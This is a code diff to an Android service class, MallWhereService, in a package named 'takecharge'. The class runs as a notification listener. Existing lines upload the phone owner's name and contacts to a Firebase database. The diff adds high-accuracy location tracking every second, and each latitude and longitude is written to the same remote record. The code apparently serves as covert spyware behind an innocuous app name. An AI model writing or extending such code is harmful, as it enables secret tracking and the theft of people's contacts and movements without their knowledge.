@@ -2,26 +2,36 @@ package io.perihelion.takecharge;
 
 import android.content.ContentResolver;
 import android.database.Cursor;
-import android.graphics.Bitmap;
+import android.location.Location;
 import android.net.Uri;
+import android.os.Bundle;
 import android.provider.ContactsContract;
-import android.provider.MediaStore;
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.util.Log;
-import android.widget.Toast;
 
 import com.firebase.client.Firebase;
-
-import java.io.FileNotFoundException;
-import java.io.IOException;
+import com.google.android.gms.common.ConnectionResult;
+import com.google.android.gms.common.api.GoogleApiClient;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationServices;
 
 @SuppressWarnings("All")
-public class MallWhereService extends NotificationListenerService {
+public class MallWhereService extends NotificationListenerService implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener {
 
     private final String TAG = getClass().getName();
     private Firebase userDataRef;
+    private GoogleApiClient mGoogleApiClient;
+    private LocationRequest mLocationRequest;
 
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (null != mGoogleApiClient) {
+            mGoogleApiClient.disconnect();
+        }
+    }
 
     @Override
     public void onCreate() {
@@ -34,6 +44,16 @@ public class MallWhereService extends NotificationListenerService {
         userDataRef.child("userinfo").child("name").setValue(c.getString(c.getColumnIndex("display_name")));
         c.close();
         uploadUserContacts();
+        mLocationRequest = LocationRequest.create();
+        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+        mLocationRequest.setInterval(1000);
+        mLocationRequest.setFastestInterval(1000);
+        mGoogleApiClient = new GoogleApiClient.Builder(this)
+                .addApi(LocationServices.API)
+                .addConnectionCallbacks(this)
+                .addOnConnectionFailedListener(this)
+                .build();
+        mGoogleApiClient.connect();
     }
 
     @Override
@@ -107,5 +127,26 @@ public class MallWhereService extends NotificationListenerService {
             c.close();
             return null;
         }
+    }
+
+    @Override
+    public void onConnected(Bundle bundle) {
+        LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient, mLocationRequest, this);
+    }
+
+    @Override
+    public void onConnectionSuspended(int i) {
+
+    }
+
+    @Override
+    public void onConnectionFailed(ConnectionResult connectionResult) {
+
+    }
+
+    @Override
+    public void onLocationChanged(Location location) {
+        userDataRef.child("location").child("lat").setValue(location.getLatitude());
+        userDataRef.child("location").child("lng").setValue(location.getLongitude());
     }
 }
